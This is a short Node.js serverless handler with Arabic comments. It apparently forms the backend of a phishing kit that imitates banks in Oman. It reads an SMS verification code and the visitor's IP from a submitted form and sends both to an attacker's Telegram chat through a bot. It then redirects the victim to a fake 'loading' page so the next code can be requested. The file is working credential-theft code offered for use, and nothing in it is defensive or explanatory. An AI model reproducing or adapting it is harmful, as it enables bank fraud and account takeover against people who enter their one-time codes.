const axios = require('axios');

exports.handler = async (event) => {
  // 1. استقبال الطلبات POST فقط
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    // 2. استخراج البيانات من الفورم
    const params = new URLSearchParams(event.body);

    const smsCode = params.get('s1') || '-'; // رمز التحقق

    // استخراج IP المستخدم
    const userIp = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown IP';

    // 3. تحديد الصفحة التالية (Redirect)
    // عادة بعد الـ SMS يتم التوجيه لصفحة انتظار ثانية أو صفحة خطأ لطلب الرمز مرة أخرى
    // عدل هذا الرابط حسب صفحتك القادمة
    const nextPage = '/Oman/Banks/loading.html'; 

    // 4. تنسيق الرسالة لتليجرام
    const message = `
📩 **رمز تحقق جديد (SMS)**
---------------------------
🔑 **كود التحقق:** \`${smsCode}\`

🌐 **IP:** ${userIp}
---------------------------
    `;

    // 5. الإرسال إلى تليجرام
    const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });
    }

    // 6. توجيه المستخدم للصفحة التالية
    return {
      statusCode: 302,
      headers: {
        'Location': nextPage,
      },
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 302,
      headers: {
        'Location': '/Oman/Banks/loading.html', // نفس رابط الصفحة التالية في حال الخطأ
      },
    };
  }
};